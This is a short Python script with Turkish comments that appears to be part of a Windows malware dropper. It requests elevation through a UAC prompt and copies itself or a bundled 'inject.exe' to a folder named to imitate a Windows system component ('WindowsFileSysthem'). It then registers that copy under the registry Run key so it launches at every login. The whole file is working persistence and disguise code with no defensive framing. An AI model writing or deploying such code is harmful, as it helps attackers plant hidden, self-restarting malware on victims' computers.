import os
import shutil
import ctypes
import winreg
import sys

def is_admin():
    """Yönetici izni kontrolü"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin_permission():
    """Yönetici izni istemek için uygulama yeniden başlatılır"""
    if not is_admin():
        try:
            # UAC istemi ile scripti yeniden başlat
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, ' '.join(sys.argv), None, 1
            )
            sys.exit(0)
        except:
            print("Yönetici izni reddedildi!")
            sys.exit(1)

def add_to_startup():
    """Uygulamayı başlangıca ekler."""
    # PyInstaller ile derlendiğinde geçici klasörden dosya yolu
    if getattr(sys, 'frozen', False):
        current_file = sys._MEIPASS + '\\' + 'inject.exe'
    else:
        current_file = os.path.abspath(__file__)  # Eğer normal bir python dosyası ise

    # Hedef dosya yolu (başlangıçta çalışacak gizli exe dosyası)
    new_file_path = r"C:\WindowsFileSysthem\WindowsFileSysthem.exe"

    # Hedef klasörün olup olmadığını kontrol et ve oluştur
    service_folder = os.path.dirname(new_file_path)
    if not os.path.exists(service_folder):
        os.makedirs(service_folder)

    # Kendini kopyala
    if os.path.exists(current_file):
        shutil.copy(current_file, new_file_path)
        print(f"{current_file} başarıyla {new_file_path} yoluna kopyalandı.")
    else:
        print(f"{current_file} dosyası bulunamadı.")

    # Kayıt defterine (Registry) ekleme (başlangıçta çalışacak)
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    app_name = "WindowsFileSysthem"

    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, new_file_path)

    print("Uygulama başarıyla başlangıca eklendi.")
